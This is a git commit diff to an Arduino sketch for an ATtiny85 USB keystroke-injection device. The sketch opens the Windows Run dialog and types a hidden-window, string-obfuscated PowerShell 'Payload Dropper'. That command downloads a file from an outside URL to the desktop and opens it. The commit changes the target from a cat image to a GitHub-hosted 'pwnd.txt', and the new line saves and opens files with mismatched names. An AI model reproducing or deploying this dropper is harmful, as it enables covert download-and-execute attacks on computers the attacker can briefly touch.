9d0f767fa311197fd2a6b766540ed0a6d5e15e93
rootghost99 <88153999+rootghost99@users.noreply.github.com>
2025-01-18 15:51:28 -0500

    Update DumpFilev2.ino

--- payloads/attiny85/DumpFilev2.ino
+++ payloads/attiny85/DumpFilev2.ino
@@ -8,7 +8,7 @@ void loop() {
   DigiKeyboard.delay(3000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(500);
-  DigiKeyboard.println(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"https://miro.medium.com/max/1000/1*7_m4dF9OqBjePqqRyJ1O-g.jpeg\\\",\\\"$env:UserProfile\\desktop\\catz.jpeg\\\");in'v'oke-item $env:UserProfile\\desktop\\catz.jpeg")); //Payload Dropper
+  DigiKeyboard.println(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"https://github.com/rootghost99/rduck/blob/main/payloads/attiny85/pwnd.txt \\\",\\\"$env:UserProfile\\desktop\\pnwd.txt\\\");in'v'oke-item $env:UserProfile\\desktop\\pwnd.txt")); //Payload Dropper
   DigiKeyboard.delay(500);
   digitalWrite(1, HIGH); //turn on led when program finishes
   DigiKeyboard.delay(90000);
